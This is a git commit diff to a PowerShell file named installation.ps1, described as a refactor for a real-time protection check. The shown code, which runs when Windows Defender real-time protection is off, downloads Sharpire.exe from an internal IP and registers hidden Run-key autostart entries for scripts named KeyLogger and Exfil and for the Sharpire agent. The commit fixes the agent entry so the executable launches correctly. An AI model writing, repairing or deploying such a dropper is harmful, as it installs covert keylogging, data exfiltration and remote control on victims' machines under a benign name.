126ce86ebdf7a4e7134b2168bf67e8bcbec1dcba
Nate W <128198305+natewildr@users.noreply.github.com>
2026-01-09 11:22:39 -0500

    Refactor installation script for real-time protection check

--- installation.ps1
+++ installation.ps1
@@ -6,5 +6,6 @@ if (Get-MpComputerStatus | Where-Object {$_.RealTimeProtectionEnabled -like 'Fal
 	Invoke-WebRequest -URI http://10.0.0.27:8000/Sharpire.exe -OutFile C:\Windows\Temp\Security\Sharpire.exe;
 	REG Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "KeyLogger" /t REG_SZ /F /D "powershell.exe -WindowStyle hidden -file C:\Windows\Temp\Security\KeyLogger.ps1";
 	REG Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Exfil" /t REG_SZ /F /D "powershell.exe -WindowStyle hidden -file C:\Windows\Temp\Security\Exfil.ps1";
-	REG Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Agent" /t REG_SZ /F /D "powershell.exe -WindowStyle hidden -file C:\Windows\Temp\Security\Sharpire.exe";
+	REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Agent" /T REG_SZ /F /D "\"C:\Windows\Temp\Security\Sharpire.exe\""
 }
+
